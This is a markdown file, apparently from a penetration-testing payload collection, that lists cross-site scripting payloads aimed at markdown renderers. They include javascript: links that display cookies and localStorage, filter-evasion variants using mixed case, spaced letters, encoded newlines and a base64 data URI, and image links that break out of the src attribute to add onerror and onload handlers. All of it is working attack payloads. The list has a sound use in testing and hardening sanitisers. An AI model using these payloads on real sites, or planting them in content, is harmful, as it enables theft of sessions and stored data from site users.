<!-- markdow link to XSS, this usually always work but it requires interaction -->
[a](javascript:prompt(document.cookie))

<!-- Other links attacks with some bypasses -->
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
![Uh oh...]("onerror="alert('XSS'))
![Uh oh...](https://www.example.com/image.png"onload="alert('XSS'))
![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
![Escape SRC - onerror]("onerror="alert('ImageOnError'))

